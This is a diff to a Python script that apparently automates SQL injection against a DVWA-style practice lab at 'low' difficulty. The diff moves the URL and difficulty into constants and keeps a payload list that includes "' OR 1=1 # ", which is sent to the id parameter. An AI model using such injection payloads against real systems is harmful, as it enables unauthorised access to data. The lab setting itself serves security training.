@@ -4,7 +4,12 @@ import requests
 import urllib3
 from bs4 import BeautifulSoup
 
+from conf import BASE_URL
 from util import http_get
+
+URL = BASE_URL + "/vulnerabilities/sqli/"
+
+DIFFICULTY = "low"
 
 PAYLOADS = [
     "' OR 1=1 # ",
@@ -14,19 +19,18 @@ PAYLOADS = [
 
 # -----------------------
 
-def sqli_low(base_url):
-    global PAYLOADS
+def sqli_low():
+    global URL, DIFFICULTY, PAYLOADS
 
     print("==================================")
-    print("[INFO] - SQLi low")
+    print(f"[INFO] - SQLi {DIFFICULTY}")
     
-    url = base_url + "/vulnerabilities/sqli/"
     for payload in PAYLOADS:
         params = {"id": payload, "Submit": "Submit"}
-        r = http_get(url, "low", params=params)
+        r = http_get(URL, DIFFICULTY, params=params)
+        
         soup = BeautifulSoup(r.text, "html.parser")
         div = soup.find("div", {"class": "vulnerable_code_area"})
-
         if div:
             print("----------------------------------")
             print(f"[SUCCESS]")
